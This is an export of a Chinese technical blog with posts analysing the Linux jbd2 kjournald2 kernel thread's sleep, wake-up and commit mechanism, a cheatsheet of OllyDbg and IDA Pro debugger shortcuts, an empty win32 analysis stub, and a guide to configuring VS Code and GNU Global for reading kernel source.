<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kjournald2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">journal_t</span> *journal = arg;</span><br><span class="line">	<span class="keyword">transaction_t</span> *transaction;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set up an interval timer which can be used to trigger a commit wakeup</span></span><br><span class="line">	<span class="comment">// after the commit interval expires</span></span><br><span class="line">	timer_setup(&amp;journal-&gt;j_commit_timer, commit_timeout, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	set_freezable();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Record that the journal thread is running</span></span><br><span class="line">	journal-&gt;j_task = current;</span><br><span class="line">	wake_up(&amp;journal-&gt;j_wait_done_commit);</span><br><span class="line"></span><br><span class="line">	memalloc_nofs_save();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// And now, wait forever for commit wakeup events.</span></span><br><span class="line">	write_lock(&amp;journal-&gt;j_state_lock);</span><br></pre></td></tr></table></figure>

<p>为了方便说明，我省略了部分本文分析中不重要的注释。</p>
<p>在函数的开头，定义了一个重要的变量 <code>journal</code>，它的类型为 <code>journal_t *</code>，是一个指向 jbd2 <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9pbmNsdWRlL2xpbnV4L2piZDIuaCNMMTA0" title="https://elixir.bootlin.com/linux/latest/source/include/linux/jbd2.h#L104">相关信息结构体<i class="fa fa-external-link"></i></span>的指针，它的值来自于调用 <code>kthread_run()</code> 函数时传递的 <code>journal</code> 参数。</p>
<p>在这里我们需要注意以下几件事</p>
<ul>
<li>设定 <strong>timer</strong>，调用 <code>timer_setup()</code> 初始化一个定时器，将它放入 <code>journal-&gt;j_commit_timer</code> 中。这个定时器之后会被用于<strong>在提交事务时</strong>定时唤醒该 kernel thread 进行作业</li>
<li>将 <code>current</code> 指针存入 <code>journal-&gt;j_task</code> 中，这样在后续的唤醒操作中就可以获取到该线程的 <strong>task_struct</strong></li>
<li>调用 <code>wake_up()</code> 唤醒存储在 <code>journal-&gt;j_wait_done_commit</code> 的等待队列，这与该 jbd2 kernel thread 的 <strong>create/destroy</strong> 有关，此处不再赘述，感兴趣的话直接 cross reference <code>j_wait_done_commit</code> 即可</li>
</ul>
<p>在初始化了相关变量之后，<code>kjournald2()</code> 进入了循环，先看下面这段代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">loop:</span><br><span class="line">	<span class="comment">// some code hide</span></span><br><span class="line">	<span class="keyword">if</span> (journal-&gt;j_commit_sequence != journal-&gt;j_commit_request) &#123;</span><br><span class="line">		jbd_debug(<span class="number">1</span>, <span class="string">"OK, requests differ\n"</span>);</span><br><span class="line">		write_unlock(&amp;journal-&gt;j_state_lock);</span><br><span class="line">		del_timer_sync(&amp;journal-&gt;j_commit_timer);</span><br><span class="line">		jbd2_journal_commit_transaction(journal);</span><br><span class="line">		write_lock(&amp;journal-&gt;j_state_lock);</span><br><span class="line">		<span class="keyword">goto</span> loop;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>为了说明方便，这里省略了部分代码。这里有两个重要的变量</p>
<ul>
<li><code>journal-&gt;j_commit_sequence</code> 最近一次 commit 的 transaction 序列号</li>
<li><code>journal-&gt;j_commit_request</code> 申请 commit 的 transaction 序列号</li>
</ul>
<p><code>kjournald2()</code> 通过判断这两个序列号是否相同，来决定是否进行 <strong>commit transaction</strong> 操作。当这两个序列号不同的时候，就意味着当前需要被 commit 的 transaction 并未 commit 到外存储器当中，因而调用 <code>jbd2_journal_commit_transaction()</code> 来进行提交。</p>
<p>除了一些进程同步之间的锁之外，可以看到这里有一个函数 <code>del_timer_sync()</code> 的调用，实际上这是因为在外部函数中，会通过 <code>add_timer()</code> 来为 <code>kjournald2()</code> 函数设置定时器，时间一到就会唤醒。这里因为完成了 transaction commit，就不再需要 timer 了。下次再有相关 transaction 要提交的时候，再设置 timer 即可。</p>
<p>继续 go through 函数的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// after above</span></span><br><span class="line">    wake_up(&amp;journal-&gt;j_wait_done_commit);</span><br><span class="line">    <span class="keyword">if</span> (freezing(current)) &#123;</span><br><span class="line">        <span class="comment">// some code</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        DEFINE_WAIT(wait);</span><br><span class="line">        <span class="keyword">int</span> should_sleep = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        prepare_to_wait(&amp;journal-&gt;j_wait_commit, &amp;wait, TASK_INTERRUPTIBLE);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (journal-&gt;j_commit_sequence != journal-&gt;j_commit_request)</span><br><span class="line">            should_sleep = <span class="number">0</span>;</span><br><span class="line">        transaction = journal-&gt;j_running_transaction;</span><br><span class="line">        <span class="keyword">if</span> (transaction &amp;&amp; time_after_eq(jiffies, transaction-&gt;t_expires))</span><br><span class="line">            should_sleep = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (journal-&gt;j_flags &amp; JBD2_UNMOUNT)</span><br><span class="line">            should_sleep = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (should_sleep) &#123;</span><br><span class="line">            write_unlock(&amp;journal-&gt;j_state_lock);</span><br><span class="line">            schedule();</span><br><span class="line">            write_lock(&amp;journal-&gt;j_state_lock);</span><br><span class="line">        &#125;</span><br><span class="line">        finish_wait(&amp;journal-&gt;j_wait_commit, &amp;wait);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jbd_debug(<span class="number">1</span>, <span class="string">"kjournald2 wakes\n"</span>);</span><br><span class="line"></span><br><span class="line">    transaction = journal-&gt;j_running_transaction;</span><br><span class="line">    <span class="keyword">if</span> (transaction &amp;&amp; time_after_eq(jiffies, transaction-&gt;t_expires)) &#123;</span><br><span class="line">        journal-&gt;j_commit_request = transaction-&gt;t_tid;</span><br><span class="line">        jbd_debug(<span class="number">1</span>, <span class="string">"woke because of timeout\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure>

<p>以上是循环中剩余的代码，在进行完必要的初始化之后，<code>kjournald2()</code> 进行了<strong>一些判断</strong>，如果符合，则会进行 <code>schedule()</code>，主动放弃 CPU 资源，进入等待唤醒的状态。</p>
<p>上述代码有几个部分需要注意</p>
<ol>
<li><code>prepare_to_wait()</code> 和 <code>finish_wait()</code> 函数，这一对函数用于<strong>处理等待队列</strong></li>
<li><code>should_sleep</code> 变量，根据一系列条件判断，决定是否自主 <strong>schedule</strong></li>
<li><code>journal-&gt;j_commit_request</code> 更新，后续进程 transaction commit 操作</li>
</ol>
<p>本文聚焦于 kernel thread 的工作机理，因此这里我们着重于<strong>唤醒(wake up)</strong>和<strong>作业(workloads)</strong>两个部分，<strong>唤醒</strong>包括 <code>kjournald2</code> 如何 schedule 以及其他 kernel function 如何 wake up 它；<strong>作业</strong>包括 <code>kjournald2</code> 如何判断是否 commit 以及如何触发 <code>kjournald2</code> 的 commit。</p>
<h3 id="Wake-Up"><a href="#Wake-Up" class="headerlink" title="Wake Up"></a>Wake Up</h3><h4 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h4><p>前文提到 <code>kjournald</code> 中使用了两个函数来处理等待队列，这里我们再回顾一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prepare_to_wait(&amp;journal-&gt;j_wait_commit, &amp;wait, TASK_INTERRUPTIBLE);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">	schedule();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">finish_wait(&amp;journal-&gt;j_wait_commit, &amp;wait);</span><br></pre></td></tr></table></figure>

<p>这里需要注意，<code>prepare_to_wait</code> 和 <code>finish_wait</code> 并没有做放弃 CPU 的操作，完成这一行为的是 <code>schedule()</code>，有些 kernel thread 会调用 <code>ssleep()</code> 来放弃 CPU。前两个函数实际上是对 shared data structure <strong>journal</strong> 的修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @j_wait_commit: Wait queue to trigger commit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span>	j_wait_commit;</span><br></pre></td></tr></table></figure>

<p><code>j_wait_commit</code> 是等待队列的头指针，如<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9pbmNsdWRlL2xpbnV4L2piZDIuaCNMODQw" title="https://elixir.bootlin.com/linux/latest/source/include/linux/jbd2.h#L840">上述代码<i class="fa fa-external-link"></i></span>所示，<code>prepare_to_wait</code> 函数将之前用 <code>DEFINE_WAIT(wait)</code> 初始化的 <code>wait</code> 变量作为 entry 插入到等待队列中。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_WAIT_FUNC(name, function)					\</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_entry</span> <span class="title">name</span> = &#123;</span>					\</span><br><span class="line">		.<span class="keyword">private</span>	= current,					\</span><br><span class="line">		.func		= function,					\</span><br><span class="line">		.entry		= LIST_HEAD_INIT((name).entry),			\</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">#define DEFINE_WAIT(name) DEFINE_WAIT_FUNC(name, autoremove_wake_function)</span><br></pre></td></tr></table></figure>

<p>如上所示，<code>wait</code> 变量中包含了指向当前 <code>kjournald2()</code> 的指针，同时也有唤醒函数 <code>autoremove_wake_function</code>，这个函数会唤醒 <code>.private</code> 指向的线程。</p>
<p>之后 <code>kjournald2</code> 调用了 <code>finish_wait</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">finish_wait</span><span class="params">(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	__set_current_state(TASK_RUNNING);</span><br><span class="line">	<span class="keyword">if</span> (!list_empty_careful(&amp;wq_entry-&gt;entry)) &#123;</span><br><span class="line">		spin_lock_irqsave(&amp;wq_head-&gt;lock, flags);</span><br><span class="line">		list_del_init(&amp;wq_entry-&gt;entry);</span><br><span class="line">		spin_unlock_irqrestore(&amp;wq_head-&gt;lock, flags);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数设置当前 thread 状态为 Running，并从等待队列当中删掉对应的 entry(如果没有被删掉的话)。</p>
<p><strong>至此，关于 kjournald2 如何处理等待队列和 schedule 自身的分析都已经结束了。</strong></p>
<p>接下来是其他 kernel function 如何 wake up 它。</p>
<h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p>前文提到，在 <code>kjournald2</code> 的代码中，有一段关于 timer 的初始化工作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Set up an interval timer which can be used to trigger a commit wakeup</span></span><br><span class="line"><span class="comment">// after the commit interval expires</span></span><br><span class="line">timer_setup(&amp;journal-&gt;j_commit_timer, commit_timeout, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这里初始化了 <code>journal-&gt;j_commit_timer</code> 变量，并设置了 <code>commit_timeout</code> 函数用来在 timer 到时间点之后调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">commit_timeout</span><span class="params">(struct timer_list *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">journal_t</span> *journal = from_timer(journal, t, j_commit_timer);</span><br><span class="line">	wake_up_process(journal-&gt;j_task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在 <code>commit_timeout</code> 内部调用了 <code>wake_up_process</code> 来<strong>唤醒 kjournald2</strong>。</p>
<p><strong>那么 timer 的机制大概就是以下几个步骤</strong></p>
<ol>
<li><code>kjournald2</code> 初始化 timer，放入 <code>journal-&gt;j_commit_timer</code> 中</li>
<li><code>kjournald2</code> 调用 schedule 进入 sleep 状态</li>
<li>其他 kernel function 调用 <code>add_timer()</code> 添加时钟</li>
<li>时钟到期自动调用初始化时加入的 <code>commit_timeout</code> 函数，唤醒 <code>kjournald2</code></li>
<li><code>kjournald2</code> 被唤醒，调用 <code>del_timer_sync()</code> 删掉时钟，并进行作业</li>
<li>返回<strong>第 2 步</strong></li>
</ol>
<p>第 3 步中指的<strong>其他 kernel function</strong>，我找了一个<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9mcy9qYmQyL3RyYW5zYWN0aW9uLmMjTDEwMg==" title="https://elixir.bootlin.com/linux/latest/source/fs/jbd2/transaction.c#L102">例子<i class="fa fa-external-link"></i></span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">jbd2_get_transaction</span><span class="params">(<span class="keyword">journal_t</span> *journal, <span class="keyword">transaction_t</span> *transaction)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// some code</span></span><br><span class="line">	<span class="comment">/* Set up the commit timer for the new transaction. */</span></span><br><span class="line">	journal-&gt;j_commit_timer.expires = round_jiffies_up(transaction-&gt;t_expires);</span><br><span class="line">	add_timer(&amp;journal-&gt;j_commit_timer);</span><br><span class="line"></span><br><span class="line">	J_ASSERT(journal-&gt;j_running_transaction == <span class="literal">NULL</span>);</span><br><span class="line">	journal-&gt;j_running_transaction = transaction;</span><br><span class="line">    <span class="comment">// some code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个函数中，设定了 <code>journal-&gt;j_commit_timer.expires</code> 作为计时期限，同时我们也可以看到函数内部运行 <code>journal-&gt;j_running_transaction = transaction</code> 更新了 <strong>transcation</strong> 变量，以便后续 <code>kjournald2</code> 进行作业。</p>
<h4 id="wake-up"><a href="#wake-up" class="headerlink" title="wake_up"></a>wake_up</h4><p>前文我们谈到，<code>kjournald2</code> 函数内部调用了 <code>prepare_to_wait</code> 和 <code>finish_wait</code> 来处理等待队列。</p>
<p>当 jbd2 的内核线程函数 <code>kjournald2</code> 调用 <code>schedule()</code> 申请调度之后，其他 kernel function 可以通过 <code>wake_up()</code> 函数，利用 <code>journal-&gt;j_wait_commit</code> 里面存放的 <code>wait</code> entry 为参数，就可以成功唤醒内核线程。</p>
<p>下面是一个<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9mcy9qYmQyL2pvdXJuYWwuYyNMNDgx" title="https://elixir.bootlin.com/linux/latest/source/fs/jbd2/journal.c#L481">例子<i class="fa fa-external-link"></i></span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __jbd2_log_start_commit(<span class="keyword">journal_t</span> *journal, <span class="keyword">tid_t</span> target)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// some code</span></span><br><span class="line">		wake_up(&amp;journal-&gt;j_wait_commit);</span><br><span class="line">	<span class="comment">// some code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数调用了 <code>wake_up()</code> 函数，唤醒了存放在 <code>j_wait_commit</code> 里面 wait queue 的所有 entry。</p>
<h4 id="Back-Trace"><a href="#Back-Trace" class="headerlink" title="Back Trace"></a>Back Trace</h4><p>对 <code>__jbd2_log_start_commit</code> 等调用 <code>wake_up</code> 的函数做一个简单的反向 cross reference 追踪，找到它们的源头函数，得到如下结果</p>
<ul>
<li>jbd2_log_start_commit<ul>
<li>__jbd2_journal_force_commit<ul>
<li>jbd2_journal_force_commit_nested</li>
<li>jbd2_journal_force_commit</li>
</ul>
</li>
<li>jbd2_complete_transaction<ul>
<li>ocfs2_sync_file</li>
<li>ext4_write_inode</li>
<li>ext4_evict_inode</li>
<li><strong>ext4_sync_file</strong></li>
<li>ext4_fallocate</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>上面用<strong>粗体</strong>标出的 <code>ext4_sync_file</code> 会被 <code>sys_fsync()</code>，<code>sys_fdatasync()</code> 和 <code>sys_msync()</code> 这几个 sys call 调用，当然，是在文件系统使用 ext4 的时候。</p>
<p>利用 kernel thread 的 wake up 机制，可以反向追踪到 sys call，是一个可以拓展的点。</p>
<h3 id="Workloads"><a href="#Workloads" class="headerlink" title="Workloads"></a>Workloads</h3><p>不管是 timer 还是 wake up，都只能唤醒 <code>kjournald2</code> 内核线程，但不能直接让该线程开始 commit 作业。前文提到该线程会基于 <code>journal-&gt;j_commit_sequence</code> 和 <code>journal-&gt;j_commit_request</code> 这两个变量来判断是否进行 commit 作业，因此要分配工作，肯定需要更改这两个变量。</p>
<p>同样是在 <code>__jbd2_log_start_commit</code> 函数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __jbd2_log_start_commit(<span class="keyword">journal_t</span> *journal, <span class="keyword">tid_t</span> target)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// some code</span></span><br><span class="line">	journal-&gt;j_commit_request = target;</span><br><span class="line">	<span class="comment">// some code</span></span><br><span class="line">   	wake_up(&amp;journal-&gt;j_wait_commit);</span><br><span class="line">	<span class="comment">// some code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先给 <code>journal-&gt;j_commit_request</code> 赋了新的 Value，然后再 Call <code>wake_up</code> 函数，这样一来在 <code>kjournald2</code> 的 check 过程中，就可以转到 commit 作业中去。</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>本文以 jbd2 kernel thread 的创建、sleep/wake_up 机制还有作业机制为切入点，分析了 kernel thread 的创建和运行流程。</p>
<p>一个内核线程的运行流程一般如下所示</p>
<ol>
<li>create by some kernel function (<code>kthread_create</code> or <code>kthraed_run</code>)</li>
<li>waked up by other kernel functions - <code>wake_up</code></li>
<li>waked up by timer - <code>add_timer()</code></li>
<li>share a data structure - Loop, until X.a == VALUE</li>
</ol>
]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>kernel thread</tag>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse tools cheatsheet</title>
    <url>/2020/03/25/reverse-tools-cheatsheet/</url>
    <content><![CDATA[<p>本文介绍了常用的逆向软件的快捷键和参考步骤。（运行在 Windows 平台上，Mac 和 Linux 可能有所不同）</p>
<a id="more"></a>

<h2 id="OllyDBG-常用功能"><a href="#OllyDBG-常用功能" class="headerlink" title="OllyDBG 常用功能"></a>OllyDBG 常用功能</h2><h3 id="跟踪"><a href="#跟踪" class="headerlink" title="跟踪"></a>跟踪</h3><ul>
<li><code>F8</code> step over</li>
<li><code>F7</code> trace into</li>
<li><code>F2</code> break point</li>
<li><code>F4</code> Goto cursor，运行到光标所在处<ul>
<li>相当于在光标处按 <code>F2</code> 设置断点，再 run 到该处，再按 <code>F2</code> 取消</li>
<li>注意区别于 <strong>此处为新 eip</strong></li>
</ul>
</li>
<li><code>F9</code> run</li>
<li><code>ctrl+F9</code> 运行到函数返回处</li>
<li><code>ctrl+g</code> 地址定位（代码窗、数据窗均可用）</li>
<li><code>:</code> 给某个地址取一个标号名</li>
<li><code>;</code> 注释</li>
<li>函数调用<ul>
<li>若当前指令为 <code>call</code>，敲回车键即可进入被调函数体</li>
<li>敲 <code>esc</code> 可以退回</li>
<li><code>~</code> 可以重现敲回车时经过的路径</li>
<li>在被调函数中，查看<strong>右下角的堆栈窗口</strong>就可以看到调用该函数的位置</li>
</ul>
</li>
<li>硬件断点<ul>
<li>在数据窗使用 <code>ctrl+g</code> 定位到变量地址处，再选中该变量值得首字节，右键选择断电和硬件写入/访问，再选择跟踪字节</li>
<li>选择的字节表示若从该地址开始的 x 字节有被访问就会触发断点</li>
<li>可以从菜单栏里面的调试删除断点</li>
<li>硬件断点的个数<strong>最多为 4 个</strong>（CPU 提供 4 个调试寄存器）</li>
<li>在代码调试的时候，会碰到有些程序会检测代码的 Hash 值，若代码内容改变则会 crash，这个时候可以选择指令，右键，选择断点、硬件执行，就可以把这条指令的首地址放到硬件断点里面</li>
<li>软件断点的原理是把指令的首字节改为 <code>0xCC</code></li>
</ul>
</li>
<li>双击 <code>eip</code> （寄存器窗）回到当前跟踪到的指令处</li>
<li><strong>数据窗下方框</strong>输入 <code>? eax</code> 可以查看 eax 寄存器中的十进制和 ASCII 表示</li>
<li>数据窗格中的<strong>指针首位处敲回车</strong>可以快速跳转到指针指向地址</li>
</ul>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><ul>
<li>指令修改<ul>
<li>选中某条指令，输入新指令可以实现对该指令的修改<ul>
<li>按 <code>alt+backspace</code> 可以把修改的内容恢复原样</li>
<li>按 <code>ctrl+a</code> 可以重新分析，把代码变为黑色</li>
</ul>
</li>
<li>数据窗中按 <code>ctrl+g</code> 定位到指令的地址处，直接输入 16 进制值就可以修改机器代码</li>
<li>在代码窗中输入 db 指令，也可以修改当前指令 的机器码，例如</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+40100F    83 fb 64   cmp  ebx, 0x64</span><br></pre></td></tr></table></figure>

<p>选中上述指令后，输入 <code>db 83 0fb, 0x77</code> 可以把指令改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+40100F    83 fb 64   cmp  ebx, 0x77</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>寄存器修改</strong>：选中寄存器的当前值，输入 16 进制可以修改</li>
<li><strong>标志位修改</strong>：双击标志位的当前值可以让它反转</li>
<li><strong>eip 修改</strong>：选中目标地址所在行，右键选择此处为新 eip</li>
</ul>
<h2 id="IDA-Pro-常用功能"><a href="#IDA-Pro-常用功能" class="headerlink" title="IDA Pro 常用功能"></a>IDA Pro 常用功能</h2><ul>
<li>函数识别：IDA 能够识别<strong>标准库函数</strong>，也能识别 windows 的 api；如果要让它是被第三方的库函数，如 openssl，则可以通过 IDA 自带的工具 <strong>flair</strong> 先对 openssl.lib 进行特征提取，生成 .sig 文件，再在 IDA 中按下 <code>shift + F5</code> 加入 .sig 文件，就可以对 openssl.lib 中包括的所有函数进行识别。</li>
<li>地址定位：<code>g</code> 输入一个地址</li>
<li>注释：分号 <code>;</code></li>
<li>把某个地址重命名为标号或者变量名：<code>n</code></li>
<li>搜索字符串：<code>alt+t</code>，<strong>注意字符串不能加引号</strong></li>
<li>搜索 16 进制值：<code>alt+b</code><ul>
<li>也可以搜索加了双引号的字符串</li>
<li>通常在 16 进制模式下 <code>Hex View-1</code> 使用</li>
</ul>
</li>
<li>在<strong>汇编模式(IDA View-A)</strong>下按 <code>F5</code> 可以把当前的汇编指令转化为 C 语言</li>
<li>数据类型变换<ul>
<li><code>u</code>：让当前地址处的数据或指令变成 undefined</li>
<li><code>d</code>：改变当前变量的类型<ul>
<li>db 单字节，dw 双字节，dd 四字节</li>
<li>按 <code>Alt+D</code> 可以选择其它类型如 float、double 等</li>
</ul>
</li>
<li><code>a</code>：把当前地址处的内容识别为字符串</li>
<li><code>*</code>：把当前地址处的内容识别为一个数组</li>
<li><code>c</code>：把当前地址处的内容识别为指令</li>
<li><code>Shift+F9</code> 自定义结构类型<ul>
<li>选中某个地址，再 <code>Alt+Q</code> 可以把此地址处的内容定义为结构变量</li>
</ul>
</li>
</ul>
</li>
<li><code>ctrl+PageUp</code> 快速移动到顶部</li>
<li>交叉引用 (cross reference)<ul>
<li>把光标定位到某个变量或某个函数的首地址所在行，点菜单 <code>view-&gt;open subview-&gt;cross reference</code> 可以查看到程序中有哪些指令引用了该地址</li>
</ul>
</li>
</ul>
<h2 id="如何判断某个call是否重要"><a href="#如何判断某个call是否重要" class="headerlink" title="如何判断某个call是否重要"></a>如何判断某个call是否重要</h2><p>跟踪到某个 call 时，先用 <code>IDA</code> 对比排除是否为库函数(若为库函数就没有必要跟踪进去)，再检查参数是否是你关注的内容，最后检查返回值是否为你关注的内容，其中返回值除了 <code>eax</code> 外，有些函数会把返回值填入某个参数所指向的 <code>buf</code> 中。</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Wiki</tag>
        <tag>win32</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>win32-exploit-adverse-2</title>
    <url>/2020/03/19/win32-exploit-adverse-2/</url>
    <content><![CDATA[<p>汇编第二部分。</p>
<a id="more"></a>



<h2 id="Recite-分析"><a href="#Recite-分析" class="headerlink" title="Recite 分析"></a>Recite 分析</h2><h3 id="下载-Recite"><a href="#下载-Recite" class="headerlink" title="下载 Recite"></a>下载 Recite</h3><p><code>ReciteSetup.rar</code></p>
<h3 id="跟踪分析"><a href="#跟踪分析" class="headerlink" title="跟踪分析"></a>跟踪分析</h3>]]></content>
      <categories>
        <category>Language</category>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>win32</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode linux kernel code reading config</title>
    <url>/2020/03/19/vscode-linux-kernel-code-reading-config/</url>
    <content><![CDATA[<p>本文简要介绍了如何在 vscode 上阅读 Linux Kernel 代码，主要的功能是 code reference。不包含调试。</p>
<a id="more"></a>

<h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><h3 id="C-C-for-vscode"><a href="#C-C-for-vscode" class="headerlink" title="C/C++ for vscode"></a>C/C++ for vscode</h3><p>vscode 阅读 Linux Kernel 代码需要安装 <code>ms-vscode.cpptools</code> 这款插件，只需要在插件管理器当中搜索 <code>C/C++</code> 即可。安装完毕之后重启 vscode，在该插件的配置文件当中配置当前目录的 <code>.json</code> 文件。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Linux"</span>,</span><br><span class="line">            <span class="attr">"includePath"</span>: [</span><br><span class="line">                <span class="string">"$&#123;workspaceFolder&#125;/**"</span>,</span><br><span class="line">                <span class="string">"$&#123;workspaceFolder&#125;/include"</span>,</span><br><span class="line">                <span class="string">"$&#123;workspaceFolder&#125;/arch/x86/include/*"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"defines"</span>: [</span><br><span class="line">                <span class="string">"__GNUC__"</span>,</span><br><span class="line">                <span class="string">"__KERNEL__"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"compilerPath"</span>: <span class="string">"/usr/bin/gcc"</span>,</span><br><span class="line">            <span class="attr">"cStandard"</span>: <span class="string">"c11"</span>,</span><br><span class="line">            <span class="attr">"cppStandard"</span>: <span class="string">"c++17"</span>,</span><br><span class="line">            <span class="attr">"intelliSenseMode"</span>: <span class="string">"gcc-x64"</span>,</span><br><span class="line">            <span class="attr">"browse"</span>: &#123;</span><br><span class="line">                <span class="attr">"path"</span>: [<span class="string">"$&#123;workspaceFolder&#125;"</span>],</span><br><span class="line">                <span class="attr">"limitSymbolsToIncludedHeaders"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">"databaseFilename"</span>: <span class="string">""</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"version"</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些配置在 GUI 模式下也可以配置，也可以 <code>ctrl+P</code> 之后输入 <code>&gt;</code>，输入 <code>C/C++: Edit Configuration (JSON)</code> 进行配置。</p>
<p>同时设置<code>C_Cpp.intelliSenseEngine</code>，以便于递归搜索include文件，具体可以<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9jcHAvYy1jcHAtcHJvcGVydGllcy1zY2hlbWEtcmVmZXJlbmNlI19jb25maWd1cmF0aW9uLXByb3BlcnRpZXM=" title="https://code.visualstudio.com/docs/cpp/c-cpp-properties-schema-reference#_configuration-properties">参考此处<i class="fa fa-external-link"></i></span>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"C_Cpp.intelliSenseEngine": "Tag Parser"</span><br></pre></td></tr></table></figure>

<p>引入这些配置之后查看 Kernel 代买就不会报错了。</p>
<h3 id="GNU-Global"><a href="#GNU-Global" class="headerlink" title="GNU Global"></a>GNU Global</h3><p>这需要手动在命令行安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install global</span></span><br></pre></td></tr></table></figure>

<p>安装完成之后在 Linux Kernel 的根目录运行 <code>gtags</code> 进行初始化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zty:linux/ $ gtags</span><br></pre></td></tr></table></figure>

